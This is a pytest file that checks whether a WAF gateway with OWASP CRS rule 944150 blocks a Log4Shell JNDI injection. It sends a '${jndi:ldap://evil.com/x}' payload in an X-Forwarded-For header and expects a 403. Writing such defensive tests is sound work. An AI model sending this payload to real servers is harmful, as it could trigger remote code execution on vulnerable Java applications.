"""CRS 944 — Log4Shell / JNDI Injection.

Tests that JNDI lookup payloads (CVE-2021-44228) are blocked. The rule
lives in the Java family (REQUEST-944-APPLICATION-ATTACK-JAVA.conf), and
matches ${jndi:...} patterns in headers, query parameters, and request
bodies — the vector Log4Shell uses to reach remote code execution through
Java's JNDI naming interface.

Expected triggering rules:
  - 944150: potential remote command execution — Log4j / Log4Shell
"""

import pytest


@pytest.mark.attack
@pytest.mark.log4shell
def test_jndi_in_header(gateway_url, browser_session):
    """JNDI lookup string in X-Forwarded-For header — classic Log4Shell vector."""
    resp = browser_session.get(
        f"{gateway_url}/greet",
        params={"name": "test"},
        headers={"X-Forwarded-For": "${jndi:ldap://evil.com/x}"},
        timeout=10,
    )
    assert resp.status_code == 403, (
        f"Log4Shell attack should be blocked (expected 403, got {resp.status_code})"
    )
